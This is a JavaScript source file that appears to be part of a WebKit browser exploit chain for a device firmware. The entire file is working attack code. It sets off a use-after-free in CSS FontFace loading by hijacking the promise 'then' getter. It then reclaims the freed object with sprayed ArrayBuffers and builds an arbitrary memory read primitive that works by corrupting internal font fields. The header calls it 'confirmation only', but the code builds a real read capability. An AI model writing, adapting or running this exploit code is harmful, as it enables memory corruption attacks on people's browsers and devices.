// userland.js — UAF trigger + read primitive (WebKit confirmation only)

//#region State
const mem = {
  allocs: new Set(),
  alloc(len, ptr = true) {
    const ab = new ArrayBuffer(len);
    this.allocs.add(ab);
    return ptr ? ab.data() : ab;
  },
  free(ab) { return this.allocs.delete(ab); },
};
//#endregion

//#region init_rw — UAF + reclaim + read primitive
async function init_rw() {
  logger.info("Initiate UAF...");

  const spray_count = 0xb0;
  const spray_font_rule = `
    @font-face {
      font-family: spray;
      src: local(Helvetica Bold);
      unicode-range: U+0043;
    }
  `;
  const uaf_font_rule = `
    @font-face {
      font-family: b;
      src: url(nonexistent-font.woff);
      unicode-range: U+0042;
    }
  `;

  const abs = new Array(spray_count);

  // FontFace A — resolves synchronously
  const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
  document.fonts.add(A);
  void A.loaded;

  const style = document.createElement("style");
  document.head.appendChild(style);

  // Heap-shape around B
  for (let i = 0; i < spray_count / 4; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // FontFace B — resolves asynchronously (this is the victim)
  const uaf_font_rule_index = style.sheet.cssRules.length;
  style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);

  for (let i = spray_count / 4; i < spray_count; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // Force style recalculation
  document.body.offsetTop;

  const old_then = FontFace.prototype.then;

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A) {
        // Free B while FontFaceSet::load holds a raw reference
        style.sheet.deleteRule(uaf_font_rule_index);
        document.body.offsetTop;

        // Free B's neighbours
        for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
          const rule = style.sheet.cssRules[i];
          if (rule.cssText.includes("spray")) {
            style.sheet.deleteRule(i);
          }
        }

        document.body.offsetTop;

        // Spray with CSSFontFace-sized ArrayBuffers
        for (let i = 0; i < abs.length; i++) {
          const ab = new ArrayBuffer(constants.wk_CSSFontFace_sizeof);
          const view = new DataView(ab);

          view.setBInt(8, 1, true);                            // refcount
          view.setUint8(constants.wk_CSSFontFace_m_status, 3); // m_status: Success

          // Pre-seed the Variant tag on 13.x
          if (version.major >= 13) {
            const tag_off = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
            view.setUint8(tag_off, 1);
            for (let j = 1; j < 8; j++) view.setUint8(tag_off + j, 0);
          }

          abs[i] = ab;
        }
      }

      return undefined;
    },
  });

  // Loading 'AB' needs U+0041 (from A) and U+0042 (from B)
  const fonts = await document.fonts.load("1em a, b", "AB");
  logger.debug(`fonts: ${fonts}`);

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: old_then,
  });

  if (fonts.length !== 2) {
    throw new Error("Unable to reclaim UAF FontFace !!");
  }

  logger.info("UAF Achieved !!");

  let uaf_ab = undefined;
  let uaf_font = undefined;

  for (const font of fonts) {
    if (font.unicodeRange === "U+0-10FFFF") {
      logger.info("Found UAF FontFace !!");
      uaf_font = font;
      break;
    }
  }

  if (uaf_font === undefined) {
    throw new Error("Unable to find UAF FontFace !!");
  }

  fonts.length = 0;

  // Find the ArrayBuffer with refcount 2 (it's aliased by the FontFace)
  for (const ab of abs) {
    const view = new DataView(ab);
    if (view.getBInt(8, true).eq(2)) {
      logger.info("Found ArrayBuffer of UAF FontFace !!");
      uaf_ab = ab;
      break;
    }
  }

  if (uaf_ab === undefined) {
    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
  }

  abs.length = 0;

  const self = {
    uaf_ab,
    uaf_font,

    // ─────────────────────────────────────────────────────────────
    // read() — 4 bytes at a time through featureSettings
    //
    // On FW >= 13, we corrupt the Variant at +0x10 to select the
    // StyleRuleFontFace branch and point it at the read target.
    // On FW < 13, we use the legacy m_featureSettings path.
    // ─────────────────────────────────────────────────────────────
    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);
      const uaf_view = new DataView(self.uaf_ab);

      const useWorkaround = version.major >= 13;

      let offset = 0;
      while (offset < size) {
        const ptr = addr.add(offset);

        if (useWorkaround) {
          const tag_off = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
          const pay_off = tag_off + 8;

          uaf_view.setUint8(tag_off, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let i = 1; i < 8; i++) uaf_view.setUint8(tag_off + i, 0);
          uaf_view.setBInt(pay_off, ptr, true);
        } else {
          uaf_view.setBInt(constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
          uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
          uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
        }

        let chunk = "";
        try {
          chunk = self.uaf_font.featureSettings || "";
        } catch (e) {
          throw new Error(`featureSettings getter threw: ${e.message}`);
        }

        if (chunk.length < 5) {
          throw new Error(
            `featureSettings returned short string: ${JSON.stringify(chunk)} ` +
            `(workaround=${useWorkaround})`
          );
        }

        for (let i = 1; i < 5; i++) {
          u8[offset++] = chunk.charCodeAt(i) & 0xff;
        }
      }

      return ab;
    },

    read8(addr) {
      const ab = self.read(addr, 8);
      return new DataView(ab).getBInt(0, true);
    },
  };

  return self;
}
//#endregion